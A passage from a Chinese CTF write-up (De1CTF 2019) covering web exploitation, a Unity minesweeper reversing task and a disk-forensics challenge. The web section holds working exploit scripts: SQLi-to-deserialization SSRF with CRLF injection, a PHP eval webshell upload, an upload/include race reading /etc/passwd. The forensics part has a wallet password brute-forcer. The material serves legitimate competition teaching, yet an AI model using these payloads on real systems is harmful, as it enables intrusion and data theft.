login(&#123;&#125;, &#123;&#125;)&apos;.format(username, password)</span><br><span class="line">login(username, password)</span><br><span class="line"></span><br><span class="line">print &apos;[+] user session =&gt; &apos; + sess.cookies.get_dict()[&apos;PHPSESSID&apos;]</span><br><span class="line"></span><br><span class="line">print &apos;[+] getting fresh session to be authenticated as admin&apos;</span><br><span class="line">phpsessid, code = get_admin_session()</span><br><span class="line"></span><br><span class="line">ssrf = &apos;http://127.0.0.1/\x0d\x0aContent-Length:0\x0d\x0a\x0d\x0a\x0d\x0aPOST /index.php?action=login HTTP/1.1\x0d\x0aHost: 127.0.0.1\x0d\x0aCookie: PHPSESSID=&#123;&#125;\x0d\x0aContent-Type: application/x-www-form-urlencoded\x0d\x0aContent-Length: 200\x0d\x0a\x0d\x0ausername=admin&amp;password=jaivypassword&amp;code=&#123;&#125;&amp;\x0d\x0a\x0d\x0aPOST /foo\x0d\x0a&apos;.format(phpsessid, code)</span><br><span class="line">mood = &apos;O:10:\&quot;SoapClient\&quot;:4:&#123;&#123;s:3:\&quot;uri\&quot;;s:&#123;&#125;:\&quot;&#123;&#125;\&quot;;s:8:\&quot;location\&quot;;s:39:\&quot;http://127.0.0.1/index.php?action=login\&quot;;s:15:\&quot;_stream_context\&quot;;i:0;s:13:\&quot;_soap_version\&quot;;i:1;&#125;&#125;&apos;.format(len(ssrf), ssrf)</span><br><span class="line">mood = &apos;0x&apos;+&apos;&apos;.join(map(lambda k: hex(ord(k))[2:].rjust(2, &apos;0&apos;), mood))</span><br><span class="line"></span><br><span class="line">payload = &apos;a`, &#123;&#125;); -- -&apos;.format(mood)</span><br><span class="line"></span><br><span class="line">print &apos;[+] final sqli/ssrf payload: &apos; + payload</span><br><span class="line"></span><br><span class="line">print &apos;[+] injecting payload through sqli&apos;</span><br><span class="line">resp = publish(payload, &apos;0&apos;)</span><br><span class="line"></span><br><span class="line">print &apos;[+] triggering object deserialization -&gt; ssrf&apos;</span><br><span class="line">sess.get(_action+&apos;index&apos;)#, proxies=&#123;&apos;http&apos;:&apos;127.0.0.1:8080&apos;&#125;)</span><br><span class="line"></span><br><span class="line">print &apos;[+] admin session =&gt; &apos; + phpsessid</span><br><span class="line"></span><br><span class="line"># switching to admin session</span><br><span class="line">sess = requests.Session()</span><br><span class="line">sess.cookies = requests.utils.cookiejar_from_dict(&#123;&apos;PHPSESSID&apos;: phpsessid&#125;)</span><br><span class="line"></span><br><span class="line"># resp = sess.post(_action+&apos;publish&apos;)</span><br><span class="line"># print resp.text</span><br><span class="line"></span><br><span class="line">print &apos;[+] uploading stager&apos;</span><br><span class="line">shell = &#123;&apos;pic&apos;: (&apos;jaivy.php&apos;, &apos;&lt;?php @eval($_POST[jaivy]);?&gt;&apos;, &apos;image/jpeg&apos;)&#125;</span><br><span class="line">resp = sess.post(_action+&apos;publish&apos;, files=shell)</span><br><span class="line"># print resp.text</span><br><span class="line">webshell_url=_target+&apos;upload/jaivy.php&apos;</span><br><span class="line">print &apos;[+] shell =&gt; &apos;+webshell_url+&apos;\n&apos;</span><br><span class="line"></span><br><span class="line">post_data=&#123;&quot;jaivy&quot;:&quot;system(&apos;ls -al&apos;);&quot;&#125;</span><br><span class="line">resp = sess.post(url=webshell_url,data=post_data)</span><br><span class="line">print resp.text</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">root@kali64:~# python ssrf_crlf_getshell_exp.py </span><br><span class="line">[+] Genering 778688 captchas...</span><br><span class="line">[+] creating user session to trigger ssrf</span><br><span class="line">[+] register(a6skt6cjpr, rw2dz23fjv)</span><br><span class="line">[+] login(a6skt6cjpr, rw2dz23fjv)</span><br><span class="line">[+] user session =&gt; b4sd5q2jtb0tlh4lmqoj4mcb92</span><br><span class="line">[+] getting fresh session to be authenticated as admin</span><br><span class="line">[+] final sqli/ssrf payload: a`, 0x4f3a31303a22536f6170436c69656e74223a343a7b733a333a22757269223b733a3237373a22687474703a2f2f3132372e302e302e312f0d0a436f6e74656e742d4c656e6774683a300d0a0d0a0d0a504f5354202f696e6465782e7068703f616374696f6e3d6c6f67696e20485454502f312e310d0a486f73743a203132372e302e302e310d0a436f6f6b69653a205048505345535349443d706f633672616771686d6e686933636e6e737136636a666332340d0a436f6e74656e742d547970653a206170706c69636174696f6e2f782d7777772d666f726d2d75726c656e636f6465640d0a436f6e74656e742d4c656e6774683a203230300d0a0d0a757365726e616d653d61646d696e2670617373776f72643d6a6169767970617373776f726426636f64653d4a3165260d0a0d0a504f5354202f666f6f0d0a223b733a383a226c6f636174696f6e223b733a33393a22687474703a2f2f3132372e302e302e312f696e6465782e7068703f616374696f6e3d6c6f67696e223b733a31353a225f73747265616d5f636f6e74657874223b693a303b733a31333a225f736f61705f76657273696f6e223b693a313b7d); -- -</span><br><span class="line">[+] injecting payload through sqli</span><br><span class="line">[+] triggering object deserialization -&gt; ssrf</span><br><span class="line">[+] admin session =&gt; poc6ragqhmnhi3cnnsq6cjfc24</span><br><span class="line">[+] uploading stager</span><br><span class="line">[+] shell =&gt; http://20.20.20.128:11027/upload/jaivy.php</span><br><span class="line"></span><br><span class="line">total 12</span><br><span class="line">drwxrwxrwx 1 root     root     4096 Aug  5 18:07 .</span><br><span class="line">drwxr-xr-x 1 root     root     4096 Aug  5 18:03 ..</span><br><span class="line">-rw-r--r-- 1 www-data www-data   29 Aug  5 18:07 jaivy.php</span><br><span class="line"></span><br><span class="line">root@kali64:~#</span><br></pre></td></tr></table></figure>
<p>这里构造反序列化+SSRF+CRLF的时候注意几个点</p>
<ul>
<li><code>Content-Type</code> 要设置成 <code>application/x-www-form-urlencoded</code></li>
<li>验证码</li>
<li>PHPSESSID</li>
<li>账号密码</li>
<li>Content-Length。小心“截断”和“多取”问题导致登录失败。建议把Content-Length设置得大一些，然后再code参数后面加个与符号隔开即可。(与符号代表变量的分隔)<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\x0ausername=admin&amp;password=jaivypassword&amp;code=&#123;&#125;&amp;\x0d\x0a\x0d\x0aPOST /foo\x0d\x0a</span><br></pre></td></tr></table></figure>
</li>
</ul>
<p>另外再放出一个构造payload的php脚本</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line">$location = &quot;http://127.0.0.1/index.php?action=login&quot;;</span><br><span class="line">$uri = &quot;http://127.0.0.1/&quot;;</span><br><span class="line">$event = new SoapClient(null,array(&apos;user_agent&apos;=&gt;&quot;test\r\nCookie: PHPSESSID=gv1jimuh2ptjp1j6o2apvqp0h2\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 100\r\n\r\nusername=admin&amp;password=jaivypassword&amp;code=400125&amp;xxx=&quot;,&apos;location&apos;=&gt;$location,&apos;uri&apos;=&gt;$uri));</span><br><span class="line">$c = (serialize($event));</span><br><span class="line">echo urlencode($c);</span><br></pre></td></tr></table></figure>
<h4 id="getshell-2"><a href="#getshell-2" class="headerlink" title="getshell_2"></a>getshell_2</h4><p>进入内网之后通过做代理扫描即可发现还存在一个内网ip <code>172.18.0.2</code>，访问它能够发现如下代码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    $sandbox = &apos;/var/sandbox/&apos; . md5(&quot;prefix&quot; . $_SERVER[&apos;REMOTE_ADDR&apos;]);</span><br><span class="line">    @mkdir($sandbox);</span><br><span class="line">    @chdir($sandbox);</span><br><span class="line"></span><br><span class="line">    if($_FILES[&apos;file&apos;][&apos;name&apos;])</span><br><span class="line">    &#123;</span><br><span class="line">        $filename = !empty($_POST[&apos;file&apos;]) ? $_POST[&apos;file&apos;] : $_FILES[&apos;file&apos;][&apos;name&apos;];</span><br><span class="line">        if (!is_array($filename)) </span><br><span class="line">        &#123;</span><br><span class="line">            $filename = explode(&apos;.&apos;, $filename);</span><br><span class="line">        &#125;</span><br><span class="line">        $ext = end($filename);</span><br><span class="line">        if($ext==$filename[count($filename) - 1])</span><br><span class="line">        &#123;</span><br><span class="line">            die(&quot;try again!!!&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        $new_name = (string)rand(100,999).&quot;.&quot;.$ext;</span><br><span class="line">        move_uploaded_file($_FILES[&apos;file&apos;][&apos;tmp_name&apos;],$new_name);</span><br><span class="line">        $_ = $_POST[&apos;hello&apos;];</span><br><span class="line">        if(@substr(file($_)[0],0,6)===&apos;@&lt;?php&apos;)</span><br><span class="line">        &#123;</span><br><span class="line">            if(strpos($_,$new_name)===false)</span><br><span class="line">            &#123;</span><br><span class="line">                include($_);</span><br><span class="line">            &#125;</span><br><span class="line">            else</span><br><span class="line">            &#123;</span><br><span class="line">                echo &quot;you can do it!&quot;;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        unlink($new_name);</span><br><span class="line">    &#125;</span><br><span class="line">    else</span><br><span class="line">    &#123;</span><br><span class="line">        highlight_file(__FILE__);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>此处getshell，对应的exp如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import hashlib</span><br><span class="line"></span><br><span class="line">target = &quot;http://172.18.0.2/&quot;</span><br><span class="line">ip = &quot;172.18.0.3&quot;</span><br><span class="line">path = &quot;/var/sandbox/%s/&quot;%hashlib.md5((&quot;prefix&quot;+ip).encode()).hexdigest()</span><br><span class="line"></span><br><span class="line">#proxies=&#123;&apos;http&apos;:&apos;http://127.0.0.1:8080&apos;&#125;</span><br><span class="line">files = &#123;&quot;file&quot;:(&quot;x&quot;,open(&quot;1.txt&quot;,&quot;rb&quot;)),&quot;file[1]&quot;:(None,&apos;a&apos;),&quot;file[0]&quot;:(None,&apos;b&apos;),&quot;hello&quot;:(None,&quot;php://filter/string.strip_tags/resource=/etc/passwd&quot;)&#125;</span><br><span class="line"></span><br><span class="line">try:</span><br><span class="line">    for i in range(10):</span><br><span class="line">        requests.post(target,files=files,)</span><br><span class="line">except Exception as e:</span><br><span class="line">    print(e)</span><br><span class="line"></span><br><span class="line">for i in range(0,1000):</span><br><span class="line">    files = &#123;&quot;file&quot;:(&quot;x&quot;,open(&quot;1.txt&quot;,&quot;rb&quot;)),&quot;file[1]&quot;:(None,&apos;a&apos;),&quot;file[0]&quot;:(None,&apos;b&apos;),&quot;s&quot;:(None,&quot;system(&apos;cat /etc/flag*&apos;);&quot;),&quot;hello&quot;:(None,path+str(i)+&apos;.b&apos;)&#125;</span><br><span class="line">    resp = requests.post(target,files=files,).text</span><br><span class="line">    if len(resp)&gt;0:</span><br><span class="line">        print(resp,i)</span><br><span class="line">        break</span><br></pre></td></tr></table></figure>
<p>至于如何找到flag文件，可以直接使用如下的<code>find</code>命令</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -name &quot;*flag*&quot;</span><br></pre></td></tr></table></figure>
<h1 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h1><h2 id="Mine-Sweeping"><a href="#Mine-Sweeping" class="headerlink" title="Mine Sweeping"></a>Mine Sweeping</h2><h4 id="分析-2"><a href="#分析-2" class="headerlink" title="分析"></a>分析</h4><p>Elements.cs<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">class Elements: MonoBehaviour</span><br><span class="line">&#123;</span><br><span class="line">    void Awake()</span><br><span class="line">    &#123;   </span><br><span class="line">        int x = (int)transform.position.x;</span><br><span class="line">        int y = (int)transform.position.y;</span><br><span class="line">        //根据全局的数组设置该格子是雷还是空地</span><br><span class="line">        bIsMine = (((MayWorldBeAtPeace[x, y] ^ AreYouFerryMen[x, y]) - 233) / 2333) == 1 ? true : false;</span><br><span class="line">        //根据格子的position，将物体实例绑定到网格中</span><br><span class="line">        Grids._instance.eleGrids[(int)transform.position.x, (int)transform.position.y] = this;</span><br><span class="line">        //网格中对应格子数值设置</span><br><span class="line">        Grids._instance.DevilsInHeaven[(int)transform.position.x, (int)transform.position.y] = (bIsMine == true ? 1 : 0);</span><br><span class="line">        //隐藏reset按钮</span><br><span class="line">        resetButton = GameObject.FindGameObjectWithTag(&quot;resetButton&quot;);</span><br><span class="line">        if (resetButton)</span><br><span class="line">            resetButton.SetActive(false);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // Start is called before the first frame update</span><br><span class="line">    void Start()</span><br><span class="line">    &#123;</span><br><span class="line">        //初始化时混淆地图</span><br><span class="line">        Grids._instance.ChangeMap();</span><br><span class="line">        //测试用</span><br><span class="line">        //DawnsLight();</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">    void OnMouseUpAsButton()</span><br><span class="line">    &#123;</span><br><span class="line">        //鼠标点击对应格子触发</span><br><span class="line">        if (!Grids._instance.bGameEnd &amp;&amp; !bIsOpen)</span><br><span class="line">        &#123;   //未翻开</span><br><span class="line">            //设置翻开</span><br><span class="line">            bIsOpen = true;</span><br><span class="line">            int nX = (int)transform.position.x;</span><br><span class="line">            int nY = (int)transform.position.y;</span><br><span class="line">            if (bIsMine)</span><br><span class="line">            &#123;</span><br><span class="line">                //显示雷</span><br><span class="line">                SafeAndThunder(0);</span><br><span class="line">                Grids._instance.bGameEnd = true;</span><br><span class="line">                //游戏失败</span><br><span class="line">                Grids._instance.GameLose();</span><br><span class="line">                print(&quot;game over: lose&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">            else</span><br><span class="line">            &#123;</span><br><span class="line">                //翻到的不是雷，显示周围雷的数量+翻开相邻的周围无雷的格子</span><br><span class="line">                int adjcentNum = Grids._instance.CountAdjcentNum(nX, nY);</span><br><span class="line">                SafeAndThunder(adjcentNum);</span><br><span class="line">                Grids._instance.Flush(nX, nY, new bool[Grids.w, Grids.h]);</span><br><span class="line">            &#125;</span><br><span class="line">            if (Grids._instance.GameWin())</span><br><span class="line">            &#123;</span><br><span class="line">                //游戏胜利</span><br><span class="line">                Grids._instance.bGameEnd = true;</span><br><span class="line">                print(&quot;game over: win&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>Elements.cs是挂在每个格子身上的脚本，Awake中确定该格子是雷还是空地，Start中将地图中固定的六个摇摆位随机化，OnMouseUpAsButton检测当前格子是不是雷，并作出相应处理</p>
<p>Grid.cs<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">public bool GameWin()</span><br><span class="line">&#123;</span><br><span class="line">    foreach (Elements ele in eleGrids)</span><br><span class="line">    &#123;</span><br><span class="line">        if (!ele.bIsOpen &amp;&amp; !ele.bIsMine)</span><br><span class="line">        &#123;   //存在没翻开且不是雷的</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    foreach (Elements ele in eleGrids)</span><br><span class="line">    &#123;   //加载最后的图片</span><br><span class="line">        ele.DawnsLight();</span><br><span class="line">    &#125;</span><br><span class="line">    return true;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">public void ChangeMap()</span><br><span class="line">&#123;</span><br><span class="line">    System.Random ran = new System.Random((int)System.DateTime.Now.Millisecond);</span><br><span class="line">    const int SwingNum = 6;</span><br><span class="line">    const int Start = 0;</span><br><span class="line">    const int End = 100;</span><br><span class="line">    int[] SwingPosX = new int[SwingNum]&#123; 9, 15, 21, 10, 18, 12, &#125;;</span><br><span class="line">    int[] SwingPosY = new int[SwingNum]&#123; 0, 7, 15, 3, 16, 28 &#125;;</span><br><span class="line">    int[] RandomNum = new int[SwingNum];</span><br><span class="line">    for (int i = 0; i &lt; SwingNum; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        RandomNum[i] = ran.Next(Start, End);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    for (int i = 0; i &lt; SwingNum; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        int x = SwingPosX[i];</span><br><span class="line">        int y = SwingPosY[i];</span><br><span class="line">        eleGrids[x, y].bIsMine = RandomNum[i] &gt; 60 ? false : true ;</span><br><span class="line">        DevilsInHeaven[x, y] = eleGrids[x, y].bIsMine == true ? 1 : 0;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>Grid.cs是控制网格的脚本，主要就是检测游戏输赢以及是否按下reset按钮，ChangeMap函数会将六个摇摆位的01随机化，起到混淆作用</p>
<h4 id="exp-6"><a href="#exp-6" class="headerlink" title="exp"></a>exp</h4><ol>
<li>直接做，每次点到雷了，就记录雷的位置，反正reset按钮只会将格子都翻面，不会改变格子的01值，保守估计30min可以解决</li>
<li>逆向，分析Elements.cs，得知每个格子是不是雷，是通过全局数组决定的，然后拿全局数组MayWorldBeAtPeace和AreYouFerryMen做对应处理就可以了</li>
<li>动态调试，在游戏进去后查看Grid.cs中的，用来保存游戏数据以便reset按钮执行的DevilsInHeaven数组，解决</li>
<li>改代码，通过底层修改Grid.cs中检测游戏输赢的if语句，直接加载最后的二维码</li>
</ol>
<h2 id="DeepInReal"><a href="#DeepInReal" class="headerlink" title="DeepInReal"></a>DeepInReal</h2><p>压缩包解压得到三个文件。</p>
<p><img src="https://github.com/De1ta-team/De1CTF2019/raw/master/writeup/misc/DeepInReal/img/1.png" alt="1"></p>
<p>先看 <code>from-officer.txt</code>。</p>
<p><img src="https://github.com/De1ta-team/De1CTF2019/raw/master/writeup/misc/DeepInReal/img/2.png" alt="2"></p>
<p>大概意思是说，这个二进制文件是从嫌疑人的移动硬盘里恢复出来的，是一个 <code>AES-256</code> 加密文件，解密的密钥是世界上最常用和最弱的。</p>
<p>根据 <code>officer</code> 的提示，我们可以上网查一下世界上最常用和最弱的密码是什么。</p>
<p><img src="https://github.com/De1ta-team/De1CTF2019/raw/master/writeup/misc/DeepInReal/img/3.png" alt="3"></p>
<p>根据维基百科的记录， 2019 年最常用的密码排在第一位的是 <code>123456</code> 。</p>
<p>那么我们用题目所提供的加解密软件 <code>WinAES</code> 和密钥 <code>123456</code> 即可解密 <code>recovered.bin</code> 文件。</p>
<p><img src="https://github.com/De1ta-team/De1CTF2019/raw/master/writeup/misc/DeepInReal/img/4.png" alt="4"></p>
<p>得到解密文件 <code>recovered.bin.decrypted</code>，很自然地想查看文件类型，就去查看一下文件的头部。</p>
<p><img src="https://github.com/De1ta-team/De1CTF2019/raw/master/writeup/misc/DeepInReal/img/5.png" alt="5"></p>
<p>这个文件原名叫 <code>linj.vmdk</code>，是一个 <code>vmdk</code> 映像文件。它的文件头部被修改过，我们可以参照其它 <code>vmdk</code> 格式的文件头部，把头部改回正常。</p>
<p><img src="https://github.com/De1ta-team/De1CTF2019/raw/master/writeup/misc/DeepInReal/img/6.png" alt="6"></p>
<p>这时候就是一个正常的 <code>vmdk</code> 文件了。我们可以使用 <code>开源取证工具</code> 或者 <code>商业取证工具</code> 进行 静态取证，也可以使用 <code>专业仿真软件</code> 或者 <code>VMware</code> 进行 <code>动态取证</code>。</p>
<p>我这里使用 <code>取证大师</code> 进行 <code>静态取证</code>，使用 <code>VMware</code> 进行 <code>动态取证</code>。</p>
<p>在 <code>VMware</code> 中加载这个镜像文件，开机后登录系统需要密码，密码提示 <code>headers</code> 。</p>
<p>刚才我们在文件头处看到了 <code>i_love_kdmv</code>，这个就是系统登录的密码。</p>
<p><img src="https://github.com/De1ta-team/De1CTF2019/raw/master/writeup/misc/DeepInReal/img/7.png" alt="7"></p>
<p><img src="https://github.com/De1ta-team/De1CTF2019/raw/master/writeup/misc/DeepInReal/img/8.png" alt="8"></p>
<p>登录后，在桌面右上角看到一张便签，大概意思是，“你不应该到这里来，我已经删除了一条重要的钥匙，怎么找到我？”。</p>
<p>这里的“我”指的是“便签”。嫌疑人很可能使用系统自带的功能进行信息的隐藏。我们可以先找到 <code>windows 10</code> 下创建标签的方式，就是按下 <code>win+w</code> 键。</p>
<p><img src="https://github.com/De1ta-team/De1CTF2019/raw/master/writeup/misc/DeepInReal/img/9.png" alt="9"></p>
<p>从右边弹出的侧菜单栏可以看到，<code>sketchpad</code> 功能处写着 <code>bitlock</code>，点进去看看。</p>
<p><img src="https://github.com/De1ta-team/De1CTF2019/raw/master/writeup/misc/DeepInReal/img/10.png" alt="10"></p>
<p>可以看到 <code>bitlocker</code> 的密码，<code>linj920623!@#</code>，系统中确实存在一个 <code>bitlocker</code> 的加密盘。</p>
<p><img src="https://github.com/De1ta-team/De1CTF2019/raw/master/writeup/misc/DeepInReal/img/11.png" alt="11"></p>
<p>使用密码进行解密，可以成功解开加密盘。</p>
<p><img src="https://github.com/De1ta-team/De1CTF2019/raw/master/writeup/misc/DeepInReal/img/12.png" alt="12"></p>
<p>加密盘里有两个值得留意的文件。</p>
<p><img src="https://github.com/De1ta-team/De1CTF2019/raw/master/writeup/misc/DeepInReal/img/13.png" alt="13"></p>
<p>一个是数字货币加密钱包文件，另一个是密码字典。这可能是嫌疑人用来进行资金流通的数字货币钱包。</p>
<p>我们尝试写个脚本，使用密码字典对加密钱包文件进行暴力破解。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">import eth_keyfile</span><br><span class="line">import json</span><br><span class="line"></span><br><span class="line">fp = open(&apos;ethpass.dict&apos;, &apos;r&apos;)</span><br><span class="line">wallet = json.loads(open(&apos;UTC--2019-07-09T21-31-39.077Z--266ed8970d4713e8f2701cbe137bda2711b78d57&apos;, &apos;r&apos;).read())</span><br><span class="line"></span><br><span class="line">while True:</span><br><span class="line">    try:</span><br><span class="line">        password = fp.readline().strip().encode(&apos;ascii&apos;)</span><br><span class="line">        if len(password) &lt;= 0 :</span><br><span class="line">            print(&quot;password not found&quot;)</span><br><span class="line">            break</span><br><span class="line">    except:</span><br><span class="line">        continue</span><br><span class="line">    try:</span><br><span class="line">        result = eth_keyfile.decode_keyfile_json(wallet, password)</span><br><span class="line">    except:</span><br><span class="line">        continue</span><br><span class="line">    print(password)</span><br><span class="line">    print(result)</span><br><span class="line">    break</span><br></pre></td></tr></table></figure>
<p><img src="https://github.com/De1ta-team/De1CTF2019/raw/master/writeup/misc/DeepInReal/img/14.png" alt="14"></p>
<p>暴力破解可以得到结果，加密钱包密码为 <code>nevada</code>，钱包私钥为 <code>VeraCrypt Pass: V3Ra1sSe3ure2333</code>。</p>
<p>私钥提示我们有一个 <code>VeraCrypt</code> 加密的容器，它的加密密码为 <code>V3Ra1sSe3ure2333</code>。</p>
<p>那么我们需要先找到这个容器文件。这里可以使用全盘搜索包含特定字串的方法，找到这个加密容器文件。我这里使用 <code>取证大师</code> 进行取证，直接在 <code>加密文件</code> 处可以找到这个文件。</p>
<p><img src="https://github.com/De1ta-team/De1CTF2019/raw/master/writeup/misc/DeepInReal/img/15.png" alt="15"></p>
<p><img src="https://github.com/De1ta-team/De1CTF2019/raw/master/writeup/misc/DeepInReal/img/16.png" alt="16"></p>
<p>可是在 <code>VMware</code> 相对应的路径下找不到这个文件，想起便签处的提示，可能在系统加载的时候该文件被删除了。</p>
<p>我们在系统启动项处，找到一个自动删除 <code>.mylife.vera</code> 文件的隐藏脚本文件。嫌疑人故意设置了一个简易的开机自删除功能。</p>
<p><img src="https://github.com/De1ta-team/De1CTF2019/raw/master/writeup/misc/DeepInReal/img/17.png" alt="17"></p>
<p>那么我们可以直接在 <code>取证大师</code> 中导出该文件，也可以从系统盘的用户缓存目录下找到该文件。</p>
<p>使用 <code>VeraCrypt</code> 和之前找到的密码 <code>V3Ra1sSe3ure2333</code> 进行解密并挂载。</p>
<p><img src="https://github.com/De1ta-team/De1CTF2019/raw/master/writeup/misc/DeepInReal/img/18.png" alt="18"></p>
<p>我们可以找到看到加密容器内，一共有 <code>184</code> 个文件，有一堆生活照，还有一个 <code>readme</code> 文件。</p>
<p><img src="https://github.com/De1ta-team/De1CTF2019/raw/master/writeup/misc/DeepInReal/img/19.png" alt="19"></p>
<p><code>readme</code> 文件提示这里有 <code>185</code> 个文件，其中 <code>183</code> 张照片是我的生活照，所以必然有一个文件被隐藏了。</p>
<p>这个文件系统为 <code>NTFS</code>，想起嫌疑人可能使用 <code>NTFS交换数据流</code> 的方式进行文件隐藏。</p>
<p>在 <code>cmd</code> 下使用 <code>dir /r</code> 命令可以看到隐藏文件 <code>528274475768683480.jpg:k3y.txt:$DATA</code>。</p>
<p><img src="https://github.com/De1ta-team/De1CTF2019/raw/master/writeup/misc/DeepInReal/img/20.png" alt="20"></p>
<p>使用 <code>notepad 528274475768683480.jpg:k3y.txt</code> 命令，直接使用记事本打开被隐藏的文件。</p>
<p><img src="https://github.com/De1ta-team/De1CTF2019/raw/master/writeup/misc/DeepInReal/img/21.png" alt="21"></p>
<p>可以得到一串密码 <code>F1a9ZiPInD6TABaSE</code>，并且根据密码的提示，<code>flag.zip</code> 文件在数据库里。嫌疑人可能把重要文件存放在电脑的数据库里。</p>
